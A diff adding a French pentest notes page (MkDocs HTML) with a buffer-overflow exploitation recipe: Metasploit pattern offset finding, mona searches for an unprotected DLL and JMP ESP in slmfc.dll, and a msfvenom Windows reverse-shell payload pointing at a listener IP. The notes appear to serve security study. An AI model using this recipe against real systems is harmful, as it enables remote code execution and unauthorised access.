@@ -71,6 +71,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#reverse" class="md-skip">
+          Aller au contenu
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -389,6 +394,17 @@
       
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Reverse Engineering
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
@@ -398,6 +414,32 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table des matières">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table des matières
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#reverse" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reverse
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -421,6 +463,23 @@
   
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table des matières
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#reverse" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reverse
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -436,7 +495,81 @@
 
   <h1>Reverse Engineering</h1>
 
-
+<h2 id="reverse">Reverse</h2>
+<ul>
+<li>Création d'un pattern d'une longueur de 800
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>/opt/metasploit/tools/exploit/pattern_create.rb<span class="w"> </span>-l<span class="w"> </span><span class="m">800</span>
+</span></code></pre></div></li>
+<li>Envoie du pattern dans la section vulnérable</li>
+<li>Lire la valeur de EIP dans le débuggeur lorsque le programme à planté</li>
+<li>Calcul de l'offset
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>/opt/metasploit/tools/exploit/pattern_offset.rb<span class="w"> </span>-l<span class="w"> </span><span class="m">800</span><span class="w"> </span>-q<span class="w"> </span>&lt;value<span class="w"> </span>EIP&gt;
+</span></code></pre></div></li>
+<li>Vérifier que l'offset est correcte en écrivant  <code>offset * "A" + 4 * "B"</code> dans la section. La valeur de l'EIP doit être <code>42424242</code></li>
+<li>vérifier la place dispo pour la Payload, envoyant dans la section <code>offset * "A" + 4 * "B" + 80 * "C"</code>. Les "C" doivent être écrit dans la mémoire.</li>
+<li>chercher une DLL qui n'est pas sécurisé(Rebase, ASLR : False)
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>!mona modules
+</span></code></pre></div></li>
+<li>vérifier la présence d'une instruction dans une DLL et liste les adresses de où se trouve l'instruction JMPESP (l'opcode de JMPESP est <code>\xff\xe4</code> ) 
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>!mona find -s &quot;\xff\xe4&quot; -m slmfc.dll
+</span></code></pre></div></li>
+<li>Création d'un reverse shell
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.2.1<span class="w">  </span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="nv">LPORT</span><span class="o">=</span><span class="m">666</span><span class="w"> </span>-f<span class="w"> </span>c<span class="w"> </span>-e<span class="w"> </span>x86/shikata_ga_nai<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;\x00\x0D\xFF&quot;</span>
+</span></code></pre></div></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Paramètre</th>
+<th>Valeur</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-p</td>
+<td>windows/shell_reverse_tcp</td>
+<td>type de payload</td>
+</tr>
+<tr>
+<td>LHOST</td>
+<td>192.168.2.1</td>
+<td>adresse ip du listener</td>
+</tr>
+<tr>
+<td>LPORT</td>
+<td>666</td>
+<td>port du listener</td>
+</tr>
+<tr>
+<td>-f</td>
+<td>c</td>
+<td>export au format C</td>
+</tr>
+<tr>
+<td>-e</td>
+<td>x86/shikata_ga_nai</td>
+<td>encodeur</td>
+</tr>
+<tr>
+<td>-b</td>
+<td>"\x00\x0D\xFF"</td>
+<td>liste des Badchar</td>
+</tr>
+<tr>
+<td>- Maintenant, créer l'exploit avec :</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>offset + Adresse de JMPESP(inversé) + nb * NoP + Shellcode
+</span></code></pre></div></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
 
 
 
